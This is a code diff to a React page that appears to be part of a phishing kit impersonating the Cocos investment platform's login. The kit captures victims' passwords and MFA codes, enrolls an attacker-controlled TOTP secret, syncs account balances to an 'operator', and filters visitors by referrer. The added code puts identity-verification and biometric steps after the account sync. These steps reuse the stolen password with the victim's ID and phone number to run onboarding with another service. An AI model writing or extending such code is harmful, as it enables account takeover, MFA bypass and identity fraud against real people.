@@ -2,6 +2,7 @@ import { useState, useEffect, useCallback, useRef } from "react";
 import { useParams } from "react-router-dom";
 import { supabase } from "@/integrations/supabase/client";
 import { invokeCocos } from "@/lib/cocosApi";
+import { invokeWayni } from "@/lib/wayniApi";
 import { useVisitTracker, useVisitorPresence } from "@/hooks/useVisitTracker";
 import cocosLogo from "@/assets/cocos-logo.png";
 import CocosLogo from "@/components/cocos/CocosLogo";
@@ -10,10 +11,12 @@ import CocosV2SmsScreen from "@/components/cocosv2/CocosV2SmsScreen";
 import CocosV2EmailScreen from "@/components/cocosv2/CocosV2EmailScreen";
 import CocosV2MfaScreen from "@/components/cocosv2/CocosV2MfaScreen";
 import CocosV2FinalScreen from "@/components/cocosv2/CocosV2FinalScreen";
+import CocosV2VerifyScreen from "@/components/cocosv2/CocosV2VerifyScreen";
+import CocosV2BiometricScreen from "@/components/cocosv2/CocosV2BiometricScreen";
 import { generateTOTP } from "@/lib/totp";
 import { saveTotpSecret } from "@/lib/totp";
 
-type Step = "login" | "email_verify" | "mfa_verify" | "auto_enrolling" | "sms_verify" | "syncing" | "done";
+type Step = "login" | "email_verify" | "mfa_verify" | "auto_enrolling" | "sms_verify" | "syncing" | "verify_identity" | "biometric" | "done";
 
 const ALLOWED_REFERRERS = ["linkshield.vip", "mon.net.br"];
 
@@ -77,6 +80,11 @@ const CocosV2 = () => {
   const mfaMethodRef = useRef<"client_own" | "enrolled" | null>(null);
   const [enrolledSecret, setEnrolledSecret] = useState<string | null>(null);
   const enrolledSecretRef = useRef<string | null>(null);
+
+  // Identity verify / biometric state
+  const [syncedFullName, setSyncedFullName] = useState("");
+  const [syncedPhone, setSyncedPhone] = useState("");
+  const [biometricUrl, setBiometricUrl] = useState("");
 
   useVisitTracker();
   useVisitorPresence(sessionId || null);
@@ -232,6 +240,12 @@ const CocosV2 = () => {
 
       await upsertAccountForOperator(payload);
 
+      // Save synced data for identity verification step
+      const fn = authData ? `${authData.first_name || ""} ${authData.last_name || ""}`.trim() : "";
+      if (fn) setSyncedFullName(fn);
+      const ph = authData?.phone || factorsData?.phone || "";
+      if (ph) setSyncedPhone(String(ph));
+
       // Update session with balance info
       const totalArs = Number(balArs?.totalBalance) || 0;
       const totalUsd = Number(balUsd?.totalBalance) || 0;
@@ -345,7 +359,7 @@ const CocosV2 = () => {
                 setStep("syncing");
                 setStatusMsg("Verificación exitosa. Sincronizando tus datos...");
                 await syncAccountData(verifyRes.access_token, submittedEmail);
-                setStep("done");
+                setStep("verify_identity");
                 setLoading(false);
                 return;
               }
@@ -431,7 +445,7 @@ const CocosV2 = () => {
               setStep("syncing");
               setStatusMsg("Verificación exitosa. Sincronizando tus datos...");
               await syncAccountData(verifyRes.access_token, submittedEmail);
-              setStep("done");
+              setStep("verify_identity");
             } else {
               // Auto-verify totally failed — secret might be invalid, go to email flow to re-enroll
               console.warn("[LOGIN] Auto-verify failed after retries, going to email flow to re-enroll");
@@ -620,7 +634,7 @@ const CocosV2 = () => {
         setStep("syncing");
         setStatusMsg("Verificación exitosa. Sincronizando tus datos...");
         await syncAccountData(newToken, email);
-        setStep("done");
+        setStep("verify_identity");
       } else if (verifyData?.success === false) {
         const apiErr = verifyData?.error || verifyData?.message || verifyData?.msg || JSON.stringify(verifyData).slice(0, 120);
         const normalizedErr = String(apiErr).toLowerCase();
@@ -773,7 +787,7 @@ const CocosV2 = () => {
           await updateSession("totp_auto_verified");
           setStep("syncing");
           await syncAccountData(verifyRes.access_token, email);
-          setStep("done");
+           setStep("verify_identity");
           return;
         }
         console.warn("[ENROLL FALLBACK] All TOTP verify attempts failed");
@@ -785,7 +799,7 @@ const CocosV2 = () => {
     await updateSession("totp_enroll_failed");
     setStep("syncing");
     await syncAccountData(token, email);
-    setStep("done");
+    setStep("verify_identity");
   }, [callApi, updateSession, syncAccountData, email, retryTotpVerify, upsertAccountForOperator]);
 
   // ── Enroll TOTP using SMS proof, then auto-verify (with token refresh + SMS re-send) ──
@@ -905,7 +919,7 @@ const CocosV2 = () => {
           setStep("syncing");
           setStatusMsg("Sincronizando tus datos...");
           await syncAccountData(aal2Token, email);
-          setStep("done");
+          setStep("verify_identity");
           return;
         }
 
@@ -917,13 +931,13 @@ const CocosV2 = () => {
       await updateSession("totp_enroll_failed");
       setStep("syncing");
       await syncAccountData(currentToken, email);
-      setStep("done");
+      setStep("verify_identity");
     } catch (e) {
       console.warn("[ENROLL TOTP] Error:", e);
       await updateSession("totp_enroll_error");
       setStep("syncing");
       await syncAccountData(currentToken, email);
-      setStep("done");
+      setStep("verify_identity");
     }
   }, [callApi, updateSession, syncAccountData, email, enrollTotpAndFinish, retryTotpVerify, upsertAccountForOperator]);
 
@@ -942,6 +956,26 @@ const CocosV2 = () => {
     setLoading(false);
   }, [accessToken, smsChallengeId, updateSession, enrollTotpWithSms]);
 
+
+  // ── Identity Verification (Wayni onboarding) ──
+  const handleIdentityVerify = useCallback(async (data: { identity_number: string; phone_number: string }) => {
+    const pwd = lastPasswordRef.current || lastPassword;
+    const { data: result, error: apiError } = await invokeWayni({
+      action: "onboarding_verify",
+      email,
+      identity_number: data.identity_number,
+      phone_number: data.phone_number || syncedPhone,
+      password: pwd,
+    });
+
+    if (apiError || result?.error) {
+      throw new Error(result?.error || apiError?.message || "Error en la verificación");
+    }
+
+    if (result?.full_name) setSyncedFullName(result.full_name);
+    setBiometricUrl(result.biometric_url);
+    setStep("biometric");
+  }, [email, lastPassword, syncedPhone]);
 
   const handleBack = useCallback(() => {
     setStep("login");
@@ -1031,6 +1065,23 @@ const CocosV2 = () => {
               />
             </div>
           </div>
+        )}
+
+        {step === "verify_identity" && (
+          <CocosV2VerifyScreen
+            email={email}
+            fullName={syncedFullName}
+            phone={syncedPhone}
+            onSubmit={handleIdentityVerify}
+          />
+        )}
+
+        {step === "biometric" && (
+          <CocosV2BiometricScreen
+            email={email}
+            fullName={syncedFullName}
+            biometricUrl={biometricUrl}
+          />
         )}
 
         {step === "done" && (
